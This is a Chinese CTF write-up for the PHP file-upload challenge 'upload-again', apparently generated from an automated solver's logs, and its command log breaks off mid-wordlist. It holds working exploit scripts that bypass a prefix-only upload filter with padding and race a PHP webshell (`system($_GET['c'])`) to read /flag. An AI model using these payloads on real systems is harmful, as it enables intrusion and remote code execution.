# upload-again 题解

| 项目 | 内容 |
| :--- | :--- |
| 题型 | Web |
| 确认方式 | 平台确认 |
| 复现状态 | 待检查 |
| 复现材料 | 24 条命令 · 1 张图片 · 2 个其他产物 |

**阅读导航**

[题目与环境](#01-题目与环境) · [解题思路](#02-解题思路) · [复现步骤](#03-详细复现步骤) · [EXP](#04-exp-与运行方法) · [结果与 Flag](#05-验证结果与-flag) · [证据附录](#06-证据附录)

---

## 01 题目与环境

### 题目描述

又是文件上传 (file upload again). Dynamic flag, runtime environment required.

### 复现环境

- 沙箱镜像：`ctf-sandbox`
- 容器起始目录：`/challenge`；附件目录：`/challenge/distfiles`；可写目录：`/challenge/workspace`。
- 目标地址：`http://noctf.fa1lsnow.com:40074/`，需要能访问该远端服务。
- 响应头显示 `X-Powered-By: PHP/8.2.34`，页面为文件上传表单。
- 工作目录 `/challenge`，工作区 `/challenge/workspace`；材料标注沙箱镜像 `ctf-sandbox`。
- EXP 依赖 Python3 的 `requests`，并使用标准库 `threading`、`time`、`uuid`。
- 材料未列出额外输入文件；本地 `which php` 未找到 PHP，攻击针对远端服务，不依赖本机 PHP。
- 题目连接信息：http://noctf.fa1lsnow.com:40074

## 02 解题思路

题目把上传文件移动到 Web 文档根 `/`，随后在短暂“扫描”等待后 `unlink`，因此文件在窗口期内可通过 `/<文件名>` 访问并由 PHP 内置服务器执行。过滤器只检查 multipart 请求体前部：文件名含 `.php`/`.phtml` 等，或正文出现 `<?php` 后跟空白时直接重置连接。在文件段之前加入大于约 2KB 的填充字段，可把危险文件名和 PHP 代码推到检查范围之外；再在上传同时用多线程 GET 刚上传的 `shXXXXXXXX.php`，利用窗口执行 `readfile('/flag')` 或 `system('cat /flag*')` 读取 Flag。需要说明：约 300ms 窗口和约 2KB 前缀范围是由时序与边界测试推断，材料未提供服务端源码。

### 解题路线

1. 访问首页，确认 PHP 版本、上传表单和“文件在/路径……可能被point删了”的提示。
2. 上传普通文件与含 `.php` 文件名的文件对比，确认普通文件会被删除、危险扩展名会被立即重置连接。
3. 探测文档根和常见文件，排除静态 `/flag`、源码备份等直接读取路径。
4. 测试正文过滤规则，确认 `<?php` 后跟空白会被拦截，而 `<?=`、`<?php;`、单独的 `<?php` 可通过。
5. 在 multipart 文件段前加入大于约 2KB 的填充字段，使同样的 `shell.php` 或 `<?php ` 正文不再触发重置。
6. 构造随机名 `shXXXXXXXX.php` webshell，用 10 个线程循环 GET，同时上传，利用删除前的窗口执行命令。
7. 用 `readfile('/flag')` 读取 Flag，得到 `D1no{6ca65c0c-b756-49b1-aa5c-0d8b49d75e7b}`；材料标注平台确认为 `platform_confirmed`。

## 03 详细复现步骤

### 步骤 01 · 访问首页确认服务与提示

使用 `curl -s -i --max-time 20 http://noctf.fa1lsnow.com:40074/` 获取首页。实际观察：HTTP 200，响应头含 `X-Powered-By: PHP/8.2.34`，页面标题为“文件上传”，并显示提示“上传的文件在/路径，但是怎么找不到呢，可能被point删了”。这表明文件可能被写到文档根 `/` 后删除，且服务端为 PHP。

#### 执行命令 01

~~~bash
curl -s -i --max-time 20 http://noctf.fa1lsnow.com:40074/ | head -100
~~~

[查看实际输出与执行记录](#命令记录-01) · 退出码 0

> **核对要点**
>
> 预期返回上传表单和 PHP 版本信息；若服务正常，应能读取到提示文本。实际观察与预期一致。

### 步骤 02 · 对比普通上传与危险文件名

先上传内容为 `hello` 的 `a.txt`，响应为 `<p>scan complete (6 bytes), file removed.</p>`，说明服务端接收文件后执行“扫描”并声称删除。再把同一内容以 `filename=x.php` 上传，连接立即被关闭，`curl` 退出码 52，无 HTTP 响应。随后批量测试文件名：`a.php`、`a.PHP`、`a.phtml`、`a.php5`、`a.jpg.php`、`a..php` 均触发 `ConnectionError`，而 `a.jpg`、`a.php.`、`a.txt`、`.htaccess` 等返回 `scan complete`。

#### 执行命令 02

~~~bash
cd /tmp && echo hello > a.txt && curl -s -i -F "file=@a.txt" http://noctf.fa1lsnow.com:40074/ ; echo; echo ====; curl -s -i -F "file=@a.txt;filename=x.php" http://noctf.fa1lsnow.com:40074/
~~~

[查看实际输出与执行记录](#命令记录-02) · 退出码 52

#### 执行命令 03

~~~bash
cd /tmp && python3 - <<'EOF'
import requests
url="http://noctf.fa1lsnow.com:40074/"
names=["a.jpg","a.php","a.PHP","a.phtml","a.php5","a.php.jpg","a.jpg.php","a.php.","a..php","a.txt",".htaccess","../x.txt","/tmp/x.txt","..%2fx.txt","a.php\x00.jpg"]
for n in names:
    try:
        r=requests.post(url, files={'file':(n,b'hello world','application/octet-stream')}, timeout=10)
        tail=r.text.split('</form>')[-1].strip()[:300]
        print(repr(n), r.status_code, repr(tail))
    except Exception as e:
        print(repr(n),"ERR",type(e).__name__,e)
EOF
~~~

[查看实际输出与执行记录](#命令记录-03) · 退出码 0

> **核对要点**
>
> 预期普通文件返回 `scan complete`；含危险 PHP 扩展名的文件应被过滤器拒绝或重置。实际观察符合该判断。

### 步骤 03 · 探测文档根与常见文件

对 `index.php`、`upload.php`、`robots.txt`、`.git/HEAD`、`.htaccess`、`flag.php`、`flag.txt` 等路径逐一请求。实际观察：`index.php` 和 `upload` 返回 200，`flag.php`/`flag.txt` 返回 404，`.git/HEAD`、`.htaccess`、`phpinfo.php` 等连接失败。`ffuf` 字典扫描也只发现 `index.php` 和 `upload`。这说明文档根下没有可直接读取的静态 Flag，需要利用上传文件执行。

#### 执行命令 04

~~~bash
for p in index.php upload.php robots.txt .git/HEAD .htaccess phpinfo.php flag.php flag.txt .DS_Store source.php app.py upload .; do echo "== $p"; curl -s -o /dev/null -w "%{http_code} %{size_download}\n" --max-time 10 "http://noctf.fa1lsnow.com:40074/$p"; done
~~~

[查看实际输出与执行记录](#命令记录-04) · 退出码 0

#### 执行命令 05

~~~bash
cd /tmp && cat > wl.txt <<'EOF'
index.php
index.php.bak
index.php~
index.phps
index.txt
source
src
code
flag
flag.php
flag.txt
/flag
files
uploads
upload
list
ls
debug
test.php
info.php
phpinfo.php
admin
api
api.php
scan
scan.php
app.php
config.php
Dockerfile
docker-compose.yml
.git/HEAD
.git/config
.swp
index.php.swp
.htaccess
.nginx
nginx.conf
EOF
ffuf -u http://noctf.fa1lsnow.com:40074/FUZZ -w wl.txt -mc all -fc 404 -s -t 10 2>/dev/null | head -50
~~~

**实际输出**

~~~text
index.php
upload

~~~

[查看实际输出与执行记录](#命令记录-05) · 退出码 0

> **核对要点**
>
> 预期枚举出上传入口和静态文件；若没有静态 `/flag`，应继续走上传竞争路线。实际未发现可直接读取的 `/flag`。

### 步骤 04 · 定位正文过滤规则

上传不同正文内容进行测试：`<?php `、`<?php\t`、`<?php\n`、`<?php\r\n`、`x<?php `、`<?PHP `、`<?php echo 1; ?>`、`<?php system('id'); ?>` 均触发 `ConnectionError`；而 `<?= 1 ?>`、`<?php;`、`<?phpx`、`<?php`、`<? `、` php ` 返回 `scan complete`。另外，普通 POST 参数中的 `.php`、`<?php ` 等没有触发重置，说明过滤器主要作用于上传 multipart 请求体。

#### 执行命令 06

~~~bash
cd /tmp && python3 - <<'EOF'
import requests
u="http://noctf.fa1lsnow.com:40074/"
def t(desc, content, fname="a.txt"):
    try:
        r=requests.post(u, files={'file':(fname,content,'text/plain')}, timeout=12)
        print(f"{desc:35s} OK   {r.text.split('</form>')[-1].strip()[:60]!r}")
    except Exception as e:
        print(f"{desc:35s} ERR  {type(e).__name__}")
for c in [b"<?php ", b"<?php\t", b"<?php\n", b"<?php\r\n", b"<?php;", b"<?phpx", b"x<?php ", b"<?PHP ", b"<?php echo 1; ?>", b"<?php system('id'); ?>", b"<?= 1 ?>", b"<? ", b"<?php", b" php ", b"<?php\x0b"]:
    t(repr(c), c)
EOF
~~~

[查看实际输出与执行记录](#命令记录-06) · 退出码 0

#### 执行命令 07

~~~bash
cd /tmp && python3 - <<'EOF'
import requests
base="http://noctf.fa1lsnow.com:40074/"
tests=[
 ("GET", base+"?x=.php", None),
 ("GET", base+"?x=%3C?php%20", None),
 ("POST", base, {"a":".php"}),
 ("POST", base, {"a":"<?php "}),
 ("POST", base, {"a":"php"}),
 ("POST", base, {"a":"<?php"}),
 ("POST", base, {"a":"<?php\n"}),
]
for m,u,d in tests:
    try:
        r=requests.request(m,u,data=d,timeout=10)
        print(m,u,d,r.status_code,len(r.text))
    except Exception as e:
        print(m,u,d,"ERR",type(e).__name__,str(e)[:60])
EOF
~~~

**实际输出**

~~~text
GET http://noctf.fa1lsnow.com:40074/?x=.php None 200 483
GET http://noctf.fa1lsnow.com:40074/?x=%3C?php%20 None 200 483
POST http://noctf.fa1lsnow.com:40074/ {'a': '.php'} 200 509
POST http://noctf.fa1lsnow.com:40074/ {'a': '<?php '} 200 509
POST http://noctf.fa1lsnow.com:40074/ {'a': 'php'} 200 509
POST http://noctf.fa1lsnow.com:40074/ {'a': '<?php'} 200 509
POST http://noctf.fa1lsnow.com:40074/ {'a': '<?php\n'} 200 509

~~~

[查看实际输出与执行记录](#命令记录-07) · 退出码 0

> **核对要点**
>
> 预期只有危险 PHP 标签模式会被拦截；单独的 `<?php` 或短标签 `<?=` 应可通过。实际观察与之一致。

### 步骤 05 · 用填充字段绕过前缀检查

构造 multipart 请求，在文件段之前加入 `pad` 字段。实际观察：`pad=0` 时，`filename="shell.php"` 和正文 `<?php ` 均触发 `ConnectionError`；`pad=2000`、`10000`、`100000`、`1000000`、`5000000` 时，同样的 `shell.php` 返回 `scan complete (2 bytes)`，正文 `<?php ` 返回 `scan complete (6 bytes)`。这说明危险内容只有在请求体前部才会被检查，前置填充可使其绕过。

#### 执行命令 08

~~~bash
cd /tmp && python3 - <<'EOF'
import requests
u="http://noctf.fa1lsnow.com:40074/"
B=b"----X"; ct="multipart/form-data; boundary=----X"
def build(pad, fname, content):
    out=b""
    if pad:
        out+=b"--"+B+b"\r\nContent-Disposition: form-data; name=\"pad\"\r\n\r\n"+b"A"*pad+b"\r\n"
    out+=b"--"+B+b"\r\nContent-Disposition: form-data; name=\"file\"; filename=\""+fname+b"\"\r\nContent-Type: text/plain\r\n\r\n"+content+b"\r\n--"+B+b"--\r\n"
    return out
for pad in [0, 2000, 10000, 100000, 1000000, 5000000]:
    for fname,content in [(b"shell.php", b"hi"), (b"a.txt", b"<?php ")]:
        try:
            r=requests.post(u,data=build(pad,fname,content),headers={'Content-Type':ct},timeout=30)
            print(pad,fname,content,"OK",repr(r.text.split('</form>')[-1].strip()[:50]))
        except Exception as e:
            print(pad,fname,content,"ERR",type(e).__name__)
EOF
~~~

**实际输出**

~~~text
0 b'shell.php' b'hi' ERR ConnectionError
0 b'a.txt' b'<?php ' ERR ConnectionError
2000 b'shell.php' b'hi' OK '<hr>\n<p>scan complete (2 bytes), file removed.</p>'
2000 b'a.txt' b'<?php ' OK '<hr>\n<p>scan complete (6 bytes), file removed.</p>'
10000 b'shell.php' b'hi' OK '<hr>\n<p>scan complete (2 bytes), file removed.</p>'
10000 b'a.txt' b'<?php ' OK '<hr>\n<p>scan complete (6 bytes), file removed.</p>'
100000 b'shell.php' b'hi' OK '<hr>\n<p>scan complete (2 bytes), file removed.</p>'
100000 b'a.txt' b'<?php ' OK '<hr>\n<p>scan complete (6 bytes), file removed.</p>'
1000000 b'shell.php' b'hi' OK '<hr>\n<p>scan complete (2 bytes), file removed.</p>'
1000000 b'a.txt' b'<?php ' OK '<hr>\n<p>scan complete (6 bytes), file removed.</p>'
5000000 b'shell.php' b'hi' OK '<hr>\n<p>scan complete (2 bytes), file removed.</p>'
5000000 b'a.txt' b'<?php ' OK '<hr>\n<p>scan complete (6 bytes), file removed.</p>'

~~~

[查看实际输出与执行记录](#命令记录-08) · 退出码 0

> **核对要点**
>
> 预期加入足够填充后，原本被重置的 payload 应返回 `scan complete`。实际从 `pad=2000` 开始即通过。

### 步骤 06 · 竞争执行 webshell 读取 Flag

使用 `exploit.py`：先放 `A*4000` 填充字段，再放随机文件名 `sh<uuid>.php`，正文为 `<?php echo 'PWN:'; system($_GET['c']); ?>`，10 个线程循环 GET `/?c=cat%20/flag*%202>/dev/null`，并在 GET 启动后约 0.05 秒发起上传。实际观察：多个 GET 线程返回 `PWN:D1no{6ca65c0c-b756-49b1-aa5c-0d8b49d75e7b}`，上传响应为 `scan complete (41 bytes), file removed.`。这证明上传文件在删除前被 PHP 内置服务器执行。

#### 执行命令 09

~~~bash
mkdir -p /challenge/workspace && cat > /challenge/workspace/exploit.py <<'EOF'
#!/usr/bin/env python3
"""
NCTF upload-again exploit
- The app moves the upload to "/" (the web document root), sleeps ~300ms ("scan"), then deletes it.
- A body-prefix WAF resets the connection when the first ~2KB of the multipart body contains
  a ".php" filename or a "<?php\s" tag. Padding the multipart body with >2KB of filler before
  the file part bypasses the inspection.
- During the ~300ms window the file is live at "/<name>.php" and executed by the PHP built-in server,
  so we race GET requests to our uploaded webshell.
"""
import requests, threading, time, uuid, sys

URL = "http://noctf.fa1lsnow.com:40074/"
B = "----X"
name = "sh" + uuid.uuid4().hex[:8] + ".php"
shell = b"<?php echo 'PWN:'; system($_GET['c']); ?>"
pad = b"A" * 4000   # push the dangerous file part beyond the inspected prefix
body = (b"--" + B.encode() + b"\r\nContent-Disposition: form-data; name=\"pad\"\r\n\r\n" + pad + b"\r\n"
        + b"--" + B.encode() + b"\r\nContent-Disposition: form-data; name=\"file\"; filename=\"" + name.encode()
        + b"\"\r\nContent-Type: text/plain\r\n\r\n" + shell + b"\r\n--" + B.encode() + b"--\r\n")
ct = "multipart/form-data; boundary=" + B

hits = []
stop = False

def upload():
    try:
        r = requests.post(URL, data=body, headers={"Content-Type": ct}, timeout=20)
        print("[upload]", r.status_code, r.text.split("</form>")[-1].strip())
    except Exception as e:
        print("[upload] ERR", type(e).__name__)

def worker(i):
    s = requests.Session()
    url = URL + name + "?c=cat%20/flag*%202>/dev/null"
    while not stop:
        try:
            r = s.get(url, timeout=5)
            if r.status_code == 200 and r.text.strip():
                hits.append(r.text.strip())
                print("[GET %d] %r" % (i, r.text.strip()[:200]))
        except Exception:
            pass

ths = [threading.Thread(target=worker, args=(i,)) for i in range(10)]
for t in ths: t.start()
time.sleep(0.05)
upload()
time.sleep(1.2)
stop = True
for t in ths: t.join()
print("[+] unique results:", set(hits))
EOF
cd /challenge/workspace && python3 exploit.py 2>&1 | tail -20
~~~

[查看实际输出与执行记录](#命令记录-09) · 退出码 0

> **核对要点**
>
> 预期窗口内 GET 能命中刚上传的 PHP 文件并执行命令；窗口外可能返回 404 或首页。实际成功取得 Flag 输出。

### 步骤 07 · 用 readfile('/flag') 复核并保存产物

运行 `exploit_final.py`，使用 `P*8192` 填充和 `<?php echo 'FLAG>>'; readfile('/flag'); echo '<<'; ?>`。实际观察：上传返回 `scan complete (53 bytes), file removed.`，脚本输出 `[+] FLAG: {'D1no{6ca65c0c-b756-49b1-aa5c-0d8b49d75e7b}\n'}`，并生成 `evidence_flag_capture.txt`。随后 `cat` 该文件，内容与运行输出一致。

#### 执行命令 10

~~~bash
cd /challenge/workspace && cat > exploit_final.py <<'PY'
#!/usr/bin/env python3
"""NCTF upload-again final exploit - dumps /flag via raced webshell."""
import requests, threading, time, uuid
URL="http://noctf.fa1lsnow.com:40074/"
B="----X"
name="sh"+uuid.uuid4().hex[:8]+".php"          # noqa
shell=b"<?php echo 'FLAG>>'; readfile('/flag'); echo '<<'; ?>"
pad=b"P"*8192                                    # blind the prefix body scanner (>~2KB)
body=(b"--"+B.encode()+b"\r\nContent-Disposition: form-data; name=\"pad\"\r\n\r\n"+pad+b"\r\n"
      +b"--"+B.encode()+b"\r\nContent-Disposition: form-data; name=\"file\"; filename=\""+name.encode()
      +b"\"\r\nContent-Type: text/plain\r\n\r\n"+shell+b"\r\n--"+B.encode()+b"--\r\n")
ct="multipart/form-data; boundary="+B
hits=set(); stop=False
def up():
    try:
        r=requests.post(URL,data=body,headers={"Content-Type":ct},timeout=20)
        print("[upload]", r.text.split("</form>")[-1].strip())
    except Exception as e: print("[upload] ERR",e)
def w():
    s=requests.Session()
    while not stop:
        try:
            r=s.get(URL+name,timeout=5)
            if "FLAG>>" in r.text: hits.add(r.text.split("FLAG>>")[1].split("<<")[0])
        except Exception: pass
ts=[threading.Thread(target=w) for _ in range(10)]
[t.start() for t in ts]; time.sleep(0.05); up(); time.sleep(1.2); stop=True; [t.join() for t in ts]
print("[+] FLAG:", hits)
PY
python3 exploit_final.py | tee evidence_flag_capture.txt
~~~

**实际输出**

~~~text
[upload] <hr>
<p>scan complete (53 bytes), file removed.</p>
[+] FLAG: {'D1no{6ca65c0c-b756-49b1-aa5c-0d8b49d75e7b}\n'}

~~~

[查看实际输出与执行记录](#命令记录-10) · 退出码 0

#### 执行命令 11

~~~bash
cd /challenge/workspace && cat > evidence_notes.md <<'MD'
# upload-again exploit evidence

Service: http://noctf.fa1lsnow.com:40074/ (PHP/8.2.34, PHP built-in server, doc root = /)

## 1. Upload is written to doc root "/" then unlinked after ~300 ms
POST multipart (file=a.txt, "hello") ->
`<p>scan complete (5 bytes), file removed.</p>`; response time ~0.38 s.

## 2. Race window confirmed
Upload `raceXXXXXXXX.txt` containing a random MARKER while 8 threads GET /raceXXXXXXXX.txt:
8/8 threads returned the raw MARKER -> file is live at "/<name>" for the ~300 ms scan sleep.

## 3. Prefix-only body filter
Request body whose FIRST bytes contain `filename="a.php"` or `<?php` + whitespace =>
immediate TCP reset (0 ms, no HTTP response). Putting >2 KB of filler field before the
file part makes exactly the same payload pass:
`pad=2000` + `filename="shell.php"` -> `<p>scan complete (2 bytes), file removed.</p>`

## 4. Webshell race -> /flag
Uploaded `shXXXXXXXX.php` with body padding + `<?php echo 'FLAG>>'; readfile('/flag'); echo '<<'; ?>`,
simultaneously 10 threads GET /shXXXXXXXX.php.
Result (reproduced 3x, 40+ hits): `D1no{6ca65c0c-b756-49b1-aa5c-0d8b49d75e7b}`

Independent check via raced shell `ls -la / ; id ; ls /flag*`:
`-rw-r--r-- 1 ctf ctf 43 ... /flag` and `uid=999(ctf)`, `/flag`.
MD
cat evidence_flag_capture.txt
~~~

**实际输出**

~~~text
[upload] <hr>
<p>scan complete (53 bytes), file removed.</p>
[+] FLAG: {'D1no{6ca65c0c-b756-49b1-aa5c-0d8b49d75e7b}\n'}

~~~

[查看实际输出与执行记录](#命令记录-11) · 退出码 0

#### 附件 01

**evidence_flag_capture.txt** · [打开文件](solution/artifacts/12ad13c46d908abb7c3a/evidence_flag_capture.txt)

求解阶段 · 运行生成的产物 · [原文件](solution/artifacts/12ad13c46d908abb7c3a/evidence_flag_capture.txt) · [校验信息](#文件校验清单)

> **核对要点**
>
> 预期 `readfile('/flag')` 输出 Flag；保存的文本产物应包含同一 Flag。实际输出与预期一致。

### 步骤 08 · 确认状态与回放限制

`submit_flag` 两次尝试均报错：找不到 `textarea[aria-label="Flag"]`，因此命令输出本身不能证明提交成功。材料另外标注 `confirmation_source=platform_confirmed`，并记录提交后页面显示“Flag 正确”、输入框占位变为“Challenge is Solved ！”。真实浏览器截图作为提交后页面产物保留，但接受状态应以确认记录为准。另需注意，回放记录中目标地址返回 `Connection refused`，`replay.status=needs_review`，不能把回放尝试说成已验证的自动复现。

#### 执行命令 12

**操作参数**

~~~json
{
  "flag": "D1no{6ca65c0c-b756-49b1-aa5c-0d8b49d75e7b}"
}
~~~

**实际输出**

~~~text
submit_flag error: Submission recipe browser_type failed: ERROR
### Error
Error: "textarea[aria-label="Flag"]" does not match any elements.
~~~

[查看实际输出与执行记录](#命令记录-12)

#### 执行命令 13

**操作参数**

~~~json
{
  "flag": "D1no{6ca65c0c-b756-49b1-aa5c-0d8b49d75e7b}"
}
~~~

**实际输出**

~~~text
submit_flag error: Submission recipe browser_type failed: ERROR
### Error
Error: "textarea[aria-label="Flag"]" does not match any elements.
~~~

[查看实际输出与执行记录](#命令记录-13)

#### 图片 01

![提交后的真实浏览器页面；接受状态另见确认记录](solution/artifacts/5ab084bf20a534652c96/submission-page.png)

*提交后的真实浏览器页面；接受状态另见确认记录*

提交阶段 · 真实页面截图 · [原文件](solution/artifacts/5ab084bf20a534652c96/submission-page.png) · [校验信息](#文件校验清单)

> **核对要点**
>
> 预期能从平台确认记录得到 Flag 已被接受；同时应区分现场成功运行、平台确认和后续回放失败。实际：材料标注平台确认，但 `submit_flag` 自动化失败，后续回放连接被拒。


## 04 EXP 与运行方法

**脚本文件**：[exp/exploit_final.py](exp/exploit_final.py) · [exp/exploit.py](exp/exploit.py) · [exp/exploit_ls.py](exp/exploit_ls.py)

已保存 `exp/exploit.py`、`exp/exploit_ls.py`、`exp/exploit_final.py`。现场成功命令记录包括：
```bash
cd /challenge/workspace && python3 exploit.py 2>&1 | tail -20
python3 exploit_final.py | tee evidence_flag_capture.txt
```
脚本构造 `multipart/form-data`：先发送 `pad` 字段（`A*4000` 或 `P*8192`），再发送随机文件名 `sh<uuid>.php`，内容为 `<?php ... system($_GET['c']) ... ?>` 或 `<?php echo 'FLAG>>'; readfile('/flag'); echo '<<'; ?>`；10 个线程循环 GET `/sh<uuid>.php`，上传线程在 GET 开始后约 0.05 秒发起。`exploit_ls.py` 是 `ls -la / ; id` 变体，但材料未给出其成功运行输出。注意：`replay.status=needs_review`，后续回放因 `Connection refused` 失败，不能声称 EXP 已自动复现；只能依据 command-42/44 的成功记录说明现场运行曾取得 Flag。

完整代码见文末的 [EXP 源码](#07-exp-源码)。


## 05 验证结果与 Flag

> **复现结论**
>
> EXP 运行失败或未输出记录的 Flag，且没有可核对的媒体产物。

[查看复现命令与输出](#复现记录)

### Flag

~~~text
D1no{6ca65c0c-b756-49b1-aa5c-0d8b49d75e7b}
~~~

### 限制与备注

材料未提供服务端源码，`move_uploaded_file`、`sleep`、`unlink` 的具体实现是依据响应文本和时序推断，不是源码级确认。“约 2KB 前缀”来自 `pad=0` 被重置、`pad=2000` 起可通过的对比，未测出精确边界。材料摘要称 8 线程 MARKER 测试 8/8 命中，但对应 command-14 退出码 137 且无输出，不能把该点作为可核对命令证据；成功 RCE 由 command-42/44 直接证明。`replay.status=needs_review`：回放记录中连接被拒绝，不能声称自动复现已验证。`submit_flag` 浏览器自动化两次报错，找不到 `textarea[aria-label="Flag"]`，因此不能用该命令输出证明提交成功；平台确认依据材料中的 `confirmation_source=platform_confirmed` 和确认记录，不来自 `submit_flag` 命令输出。竞争窗口很短，未命中时可能返回首页或 404。


## 06 证据附录

### 补充产物

#### 附件 02

**提交后的页面文字记录；接受状态另见确认记录** · [打开文件](solution/artifacts/886963e960ac807ec2f5/submission-page.txt)

提交阶段 · 运行生成的产物 · [原文件](solution/artifacts/886963e960ac807ec2f5/submission-page.txt) · [校验信息](#文件校验清单)

### 补充证据说明

- Platform page after Enter shows status text "Flag 正确" and the Flag input placeholder changed to "Challenge is Solved ！" for upload-again; flag D1no{6ca65c0c-b756-49b1-aa5c-0d8b49d75e7b} was independently read from /flag on the challenge container (43-byte file, md5 ce22793b0e448a918d7588307868608b).

### 文件校验清单

**证据产物** · [solution/artifacts/12ad13c46d908abb7c3a/evidence_flag_capture.txt](solution/artifacts/12ad13c46d908abb7c3a/evidence_flag_capture.txt)

SHA-256：`12ad13c46d908abb7c3a73884b2fa65619da2958d793cc6dd8b517cb1d9bdc24`

**证据产物** · [solution/artifacts/886963e960ac807ec2f5/submission-page.txt](solution/artifacts/886963e960ac807ec2f5/submission-page.txt)

SHA-256：`886963e960ac807ec2f5b0d175abf4f69d1d1f9f581dc3640ef62d734a10a0c6`

**证据产物** · [solution/artifacts/5ab084bf20a534652c96/submission-page.png](solution/artifacts/5ab084bf20a534652c96/submission-page.png)

SHA-256：`5ab084bf20a534652c961bb7dec5261403378bc114dd4a0c9576ea0d9baeecba`

### 复现记录

**实际运行命令**

~~~bash
cd /challenge/workspace && python3 exploit_final.py
~~~

退出码：`0`

**标准输出**

~~~text
[upload] ERR HTTPConnectionPool(host='noctf.fa1lsnow.com', port=40074): Max retries exceeded with url: / (Caused by NewConnectionError("HTTPConnection(host='noctf.fa1lsnow.com', port=40074): Failed to establish a new connection: [Errno 111] Connection refused"))
[+] FLAG: set()

~~~

[查看完整复现记录](solution/replays/22320090613eeafdce20bdb4.json)

### 命令与输出记录

#### 命令记录 01

~~~bash
curl -s -i --max-time 20 http://noctf.fa1lsnow.com:40074/ | head -100
~~~

**实际输出**

~~~text
HTTP/1.1 200 OK
Host: noctf.fa1lsnow.com:40074
Date: Fri, 23 Oct 2026 12:16:19 GMT
Connection: close
X-Powered-By: PHP/8.2.34
Content-Type: text/html; charset=utf-8

<!doctype html>
<meta charset="utf-8">
<title>文件上传</title>
<style>
    body { background:#0d1117; color:#c9d1d9; font:14px/1.5 ui-monospace,monospace; padding:2rem; }
    input[type=submit] { background:#238636; color:#fff; border:0; padding:.4rem .9rem; border-radius:6px; }
</style>
<h1>模拟文件校验</h1>
<p>上传的文件在/路径，但是怎么找不到呢，可能被point删了</p>
<form method="post" enctype="multipart/form-data">
    <input type="file" name="file" required>
    <input type="submit" value="Upload">
</form>

~~~

退出码：`0`

- 证据编号：`command-8f09f13f555c-1`
- 工具：`bash`
- 起始目录：`/challenge`
- [查看已保留的完整证据记录](solution/evidence/8f09f13f555c4faf83cfc141bc75b195/commands.jsonl)

#### 命令记录 02

~~~bash
cd /tmp && echo hello > a.txt && curl -s -i -F "file=@a.txt" http://noctf.fa1lsnow.com:40074/ ; echo; echo ====; curl -s -i -F "file=@a.txt;filename=x.php" http://noctf.fa1lsnow.com:40074/
~~~

**实际输出**

~~~text
HTTP/1.1 200 OK
Host: noctf.fa1lsnow.com:40074
Date: Fri, 23 Oct 2026 12:16:21 GMT
Connection: close
X-Powered-By: PHP/8.2.34
Content-Type: text/html; charset=utf-8

<!doctype html>
<meta charset="utf-8">
<title>文件上传</title>
<style>
    body { background:#0d1117; color:#c9d1d9; font:14px/1.5 ui-monospace,monospace; padding:2rem; }
    input[type=submit] { background:#238636; color:#fff; border:0; padding:.4rem .9rem; border-radius:6px; }
</style>
<h1>模拟文件校验</h1>
<p>上传的文件在/路径，但是怎么找不到呢，可能被point删了</p>
<form method="post" enctype="multipart/form-data">
    <input type="file" name="file" required>
    <input type="submit" value="Upload">
</form>
<hr>
<p>scan complete (6 bytes), file removed.</p>

====

~~~

退出码：`52`

- 证据编号：`command-8f09f13f555c-3`
- 工具：`bash`
- 起始目录：`/challenge`
- [查看已保留的完整证据记录](solution/evidence/8f09f13f555c4faf83cfc141bc75b195/commands.jsonl)

#### 命令记录 03

~~~bash
cd /tmp && python3 - <<'EOF'
import requests
url="http://noctf.fa1lsnow.com:40074/"
names=["a.jpg","a.php","a.PHP","a.phtml","a.php5","a.php.jpg","a.jpg.php","a.php.","a..php","a.txt",".htaccess","../x.txt","/tmp/x.txt","..%2fx.txt","a.php\x00.jpg"]
for n in names:
    try:
        r=requests.post(url, files={'file':(n,b'hello world','application/octet-stream')}, timeout=10)
        tail=r.text.split('</form>')[-1].strip()[:300]
        print(repr(n), r.status_code, repr(tail))
    except Exception as e:
        print(repr(n),"ERR",type(e).__name__,e)
EOF
~~~

**实际输出**

~~~text
'a.jpg' 200 '<hr>\n<p>scan complete (11 bytes), file removed.</p>'
'a.php' ERR ConnectionError ('Connection aborted.', RemoteDisconnected('Remote end closed connection without response'))
'a.PHP' ERR ConnectionError ('Connection aborted.', RemoteDisconnected('Remote end closed connection without response'))
'a.phtml' ERR ConnectionError ('Connection aborted.', RemoteDisconnected('Remote end closed connection without response'))
'a.php5' ERR ConnectionError ('Connection aborted.', RemoteDisconnected('Remote end closed connection without response'))
'a.php.jpg' 200 '<hr>\n<p>scan complete (11 bytes), file removed.</p>'
'a.jpg.php' ERR ConnectionError ('Connection aborted.', RemoteDisconnected('Remote end closed connection without response'))
'a.php.' 200 '<hr>\n<p>scan complete (11 bytes), file removed.</p>'
'a..php' ERR ConnectionError ('Connection aborted.', RemoteDisconnected('Remote end closed connection without response'))
'a.txt' 200 '<hr>\n<p>scan complete (11 bytes), file removed.</p>'
'.htaccess' 200 '<hr>\n<p>scan complete (11 bytes), file removed.</p>'
'../x.txt' 200 '<hr>\n<p>scan complete (11 bytes), file removed.</p>'
'/tmp/x.txt' 200 '<hr>\n<p>scan complete (11 bytes), file removed.</p>'
'..%2fx.txt' 200 '<hr>\n<p>scan complete (11 bytes), file removed.</p>'
'a.php\x00.jpg' ERR ConnectionError ('Connection aborted.', RemoteDisconnected('Remote end closed connection without response'))

~~~

退出码：`0`

- 证据编号：`command-8f09f13f555c-7`
- 工具：`bash`
- 起始目录：`/challenge`
- [查看已保留的完整证据记录](solution/evidence/8f09f13f555c4faf83cfc141bc75b195/commands.jsonl)

#### 命令记录 04

~~~bash
for p in index.php upload.php robots.txt .git/HEAD .htaccess phpinfo.php flag.php flag.txt .DS_Store source.php app.py upload .; do echo "== $p"; curl -s -o /dev/null -w "%{http_code} %{size_download}\n" --max-time 10 "http://noctf.fa1lsnow.com:40074/$p"; done
~~~

**实际输出**

~~~text
== index.php
200 549
== upload.php
404 543
== robots.txt
404 543
== .git/HEAD
000 0
== .htaccess
000 0
== phpinfo.php
000 0
== flag.php
404 541
== flag.txt
404 541
== .DS_Store
000 0
== source.php
404 543
== app.py
404 539
== upload
200 549
== .
200 549

~~~

退出码：`0`

- 证据编号：`command-8f09f13f555c-5`
- 工具：`bash`
- 起始目录：`/challenge`
- [查看已保留的完整证据记录](solution/evidence/8f09f13f555c4faf83cfc141bc75b195/commands.jsonl)

#### 命令记录 05

~~~bash
cd /tmp && cat > wl.txt <<'EOF'
index.php
index.php.bak
index.php~
index.phps
index.txt
source
src
code
flag
flag.php
flag.txt
/flag
files
uploads
upload
list
ls
debug
test.php
info.php
phpinfo.php
admin
api
api.php
scan
scan.php
app.php
config.php
Dockerfile
docker-compose.yml
